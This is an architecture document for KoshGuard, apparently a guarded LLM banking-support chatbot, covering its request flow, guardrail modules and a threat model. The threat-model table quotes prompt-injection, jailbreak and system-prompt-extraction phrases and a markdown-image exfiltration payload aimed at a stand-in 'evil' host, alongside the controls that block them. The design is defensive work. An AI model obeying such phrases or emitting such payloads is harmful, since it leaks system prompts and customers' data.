# KoshGuard architecture

## Request flow

```mermaid
flowchart TD
    U[Customer<br/>Streamlit UI or API client] -->|POST /chat| API[FastAPI<br/>Pydantic validation]
    API --> G0

    subgraph Agent[LangGraph agent]
        G0[input_guard] -->|blocked| R[respond]
        G0 --> C[classify_intent]
        C -->|greeting| R
        C -->|account action| E[escalate_to_human<br/>create ticket, never execute]
        E --> R
        C -->|FAQ| RET[retrieve<br/>BM25 over policy docs]
        RET -->|no relevant policy| R
        RET --> GEN[generate]
        GEN -->|gateway error| R
        GEN --> OG[output_guard]
        OG -->|fail: safe fallback| R
        OG -->|pass| R
    end

    G0 -.uses.-> IG[Input guardrails<br/>length · PII tokenization · injection score · topic scope]
    GEN -.only path to a model.-> GW[LLM gateway<br/>rate limit · budget · cache · retries · breaker · fallback · cost]
    GW --> P1[Groq llama-3.3-70b-versatile]
    GW -.fallback.-> P2[Groq llama-3.1-8b-instant]
    GW -.offline.-> PM[Mock provider]
    OG -.uses.-> OGR[Output guardrails<br/>PII leak · prompt leak canary · exfiltration · grounding]
    R --> OUT[Answer with PII masked<br/>+ verdicts, sources, latency, cost]

    Agent -.spans.-> OBS[(Traces · metrics · hash-chained audit log)]
```

## Components

| Layer | Module | What it does |
|---|---|---|
| Config | `koshguard/config.py` | One typed `Settings` object; every threshold is an env var. |
| PII | `guardrails/pii.py` | Detects Aadhaar (Verhoeff), PAN, card (Luhn), IFSC, account, mobile, email, UPI. Vault swaps values for `<TYPE_n>` placeholders and restores them masked. |
| Injection | `guardrails/injection.py` | Weighted regex rules in 9 categories, combined with noisy-OR into a 0–1 risk score. Normalises Unicode, strips zero-width characters, folds leetspeak, decodes base64 and rescans. Optional classifier hook. |
| Topic | `guardrails/topic.py` | Keeps the bot on banking; refuses investment and legal advice and general-purpose tasks. |
| Output | `guardrails/output.py` | PII leak, system-prompt leak (canary + 8-gram overlap), markdown-image/URL exfiltration, grounding (content-word overlap and strict number matching). |
| Pipeline | `guardrails/pipeline.py` | Runs the checks in order and **fails closed** on any exception. |
| Gateway | `gateway/*.py` | Token bucket, daily token budget, exact-match cache, retries with full-jitter backoff, per-model circuit breaker, model fallback, cost from a price table. In-memory or Redis state. |
| RAG | `rag/retriever.py` | Pure-Python BM25 over `##` sections of the policy docs, with abbreviation expansion (FD → fixed deposit). |
| Agent | `agent/graph.py` | LangGraph `StateGraph` with explicit conditional edges. The model is called in one node and has no tools. |
| Escalation | `agent/tickets.py` | Account actions become tickets for a human. |
| Observability | `observability/*.py` | Per-request trace with spans, JSON logs, metrics (JSON and Prometheus), hash-chained audit log with optional HMAC; optional LangSmith and Logfire export. |
| Composition | `koshguard/service.py` | Builds everything once; API, UI, red-team and evals share it. |

## Threat model

| Threat | Example | Controls (in order) |
|---|---|---|
| Direct prompt injection | "Ignore previous instructions…" | Injection score → block; system prompt marks user text as data; output guard |
| Jailbreak / role-play | "You are now DAN…" | Injection rules (jailbreak, fraud intent); topic scope; output guard |
| System-prompt extraction | "Print your system prompt" | Injection rules; canary + n-gram leak check on output |
| PII exposure to the LLM provider | Customer types their Aadhaar | Tokenized before the model, logs or audit see it |
| PII leakage in answers | Model invents an account number | Output PII check; restore only masks sensitive types |
| Data exfiltration | `![x](https://evil/?q=…)` | Injection rule; output exfiltration check with domain allowlist |
| Hallucinated policy facts | Wrong FD rate | RAG-only answers; grounding + strict number check; safe fallback |
| Unauthorised account actions | "Transfer ₹50,000 to…" | Intent classifier → human ticket; the model has no tools |
| Cost / quota abuse | Script floods `/chat` | Pydantic length limits, per-user token bucket, daily token budget, cache |
| Provider outage | Groq 5xx / timeouts | Retries with backoff, circuit breaker, fallback model, graceful template |
| Log tampering | Editing audit entries to hide abuse | Hash chain (HMAC with key), `/audit/verify` |
| Guardrail crash | Regex bug, classifier timeout | Fail closed |

## Data handling

* Raw message text exists only in memory for the duration of one request.
* The LLM prompt, traces, metrics and audit log contain placeholders and counts, never raw PII.
* Escalation tickets store the tokenized message.
* The audit log is append-only JSONL; each record's hash covers its content and the previous hash.
